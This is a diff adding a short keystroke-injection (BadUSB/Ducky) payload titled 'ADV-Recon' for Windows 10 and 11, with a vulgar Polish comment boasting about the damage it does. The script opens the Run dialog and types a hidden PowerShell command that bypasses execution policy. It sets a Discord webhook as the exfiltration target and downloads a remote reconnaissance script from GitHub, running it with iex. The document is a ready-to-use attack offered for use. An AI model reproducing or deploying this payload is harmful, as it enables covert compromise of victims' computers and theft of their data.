@@ -1,0 +1,8 @@
+REM     Title: ADV-Recon
+REM     tej pejlold cie rozjebie
+REM     Target: Windows 10, 11
+
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -Ep Bypass $dc='https://discord.com/api/webhooks/1216758248838008872/hWqo5YDMw7i6wx7FmUTEtfXUGzvo1h5DpX7_jsllGa9EHAgIYbjKWVhiitJ5gpbuAmir';$db='';irm https://raw.githubusercontent.com/Atsuieon/fz_scripts/main/advracoon/advracoon.ps1 | iex
+ENTER
